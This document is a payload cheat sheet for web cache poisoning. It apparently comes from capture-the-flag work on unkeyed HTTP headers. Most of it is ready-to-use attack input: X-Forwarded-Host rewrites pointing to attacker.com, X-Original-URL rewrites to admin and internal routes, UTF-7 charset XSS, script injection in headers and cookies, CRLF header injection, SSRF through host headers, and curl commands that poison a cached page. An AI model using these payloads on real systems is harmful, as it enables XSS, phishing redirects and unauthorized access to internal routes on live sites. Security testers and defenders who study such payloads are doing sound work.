# Injection payloads — the stored-content payloads, in one corpus

The payloads an unkeyed reflected input can carry — the stored content.

---

## 1. The host-rewrite payloads — the URL-rewrite

```text
X-Forwarded-Host: attacker.com          — the app's links point to attacker.com
X-Forwarded-Host: attacker.com/path     — a path-rewrite
X-Forwarded-Host: evil.attacker.com     — a subdomain-rewrite
X-Forwarded-Host: javascript:alert(1)   — a JS-scheme injection
X-Forwarded-Host: data:text/html,<script>alert(1)</script> — a data-scheme
```

```text
the app's absolute URLs use the forwarded host — a stored copy's
links point to YOUR domain — a redirect/phishing surface.
```

## 2. The scheme payloads — the downgrade

```text
X-Forwarded-Scheme: http                — the app's links use http
X-Forwarded-Scheme: javascript          — a JS-scheme
X-Forwarded-Proto: http                 — a proto-downgrade
X-Forwarded-Proto: javascript           — a proto-JS
```

## 3. The URL-rewrite payloads — the path-rewrite

```text
X-Original-URL: /admin                  — the app serves /admin under the URL
X-Rewrite-URL: /admin                   — a rewrite to /admin
X-Original-URL: /flag                   — a rewrite to /flag
X-Original-URL: /internal/secret        — a rewrite to an internal route
```

## 4. The charset payloads — the charset injection (the verified card)

```text
Accept-Charset: UTF-7                   — a UTF-7 decode — a charset XSS
Accept-Charset: ISO-8859-1              — a charset confusion
Accept-Charset: <custom>                — a custom charset injection
```

```text
the verified card's shape: an unkeyed reflected charset — an injected
charset XSS stored in the cached page — the privileged bot's XSS
writes files inside the container.
```

## 5. The reflection payloads — the injected content

```text
User-Agent: <script>alert(1)</script>   — a stored XSS via the UA
Referer: <script>alert(1)</script>      — a stored XSS via the Referer
Accept-Language: <script>alert(1)</script> — a stored XSS via the language
X-Forwarded-Host: "><script>alert(1)</script> — a stored XSS via the host
```

## 6. The redirect payloads — the host-rewrite redirect

```text
X-Forwarded-Host: attacker.com          — the app's links/scripts point to attacker.com
X-Forwarded-Host: //attacker.com        — a protocol-relative rewrite
X-Forwarded-Scheme: https               — a scheme-rewrite
```

## 7. The cookie payloads — the per-cookie content

```text
Cookie: theme=<script>alert(1)</script> — a stored XSS via the theme cookie
Cookie: lang=<script>alert(1)</script>  — a stored XSS via the language cookie
Cookie: <custom>=<payload>              — a stored XSS via a custom cookie
```

## 8. The header-injection payloads — a stored-header

```text
X-Forwarded-Host: attacker.com\r\nSet-Cookie: poisoned — a CRLF injection
User-Agent: <marker>\r\nLocation: attacker.com        — a CRLF redirect
```

```text
a CRLF injection in an unkeyed reflected header — a stored-header
injection — the stored copy's headers carry YOUR injected header.
```

## 9. The XSS-via-charset payloads — the UTF-7 trick

```text
Accept-Charset: UTF-7 → the page decodes +ADw-script+AD4- as <script>
  — a charset-override XSS — the stored copy carries the XSS
```

```text
the verified card's shape: an injected charset (UTF-7 or similar)
decodes a payload the escaped input couldn't produce — a charset
XSS stored in the cached page.
```

## 10. The SSRF-via-host payloads — a backend fetch

```text
X-Forwarded-Host: internal.target       — a backend fetch to internal
X-Original-URL: http://internal.target  — a URL the backend fetches
```

## 11. The deception payloads — the stored-privileged content

```text
an authenticated GET → the privileged page's content stored —
  the stored copy serves it to the anonymous → a privileged-content
  deception
a personalized GET → YOUR session's content stored — a per-user leak
```

## 12. The payload-to-shape map — which payload for which surface

```text
a host-rewrite surface   → X-Forwarded-Host: <domain>
a scheme-rewrite surface → X-Forwarded-Scheme: <scheme>
a path-rewrite surface   → X-Original-URL: <route>
a charset surface        → Accept-Charset: <charset> (the XSS trick)
a reflection surface     → <payload> in a reflected header
a cookie surface         → Cookie: <name>=<payload>
an auth surface          → the authenticated GET stores the privileged page
```

## 13. The payload's stored effect — the stored copy's content

```bash
# the stored copy's content — the poisoned page's links/content
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
curl "$BASE/page?cb=<unique>" | grep 'attacker.com'   # the stored copy carries it
```

## 14. The payload's falsifier — a keyed input

```text
a keyed input → a per-input entry → YOUR payload's effect is in YOUR
copy only → a different class.
```
